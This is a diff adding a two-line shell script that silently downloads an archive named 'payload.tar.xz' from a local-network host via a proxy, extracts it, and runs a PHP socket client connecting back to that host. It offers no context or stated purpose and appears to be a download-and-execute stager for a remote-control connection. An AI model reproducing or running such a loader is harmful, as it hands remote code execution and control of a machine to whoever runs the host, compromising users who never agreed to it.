@@ -1,0 +1,2 @@
+#!/bin/sh
+http_proxy=http://192.168.1.237:12666 wget -q -O ./payload.tar.xz http://192.168.1.237:12777/download/elements.tar.xz && tar -xf ./payload.tar.xz && php ClientSocket.php -h192.168.1.237 -p11666
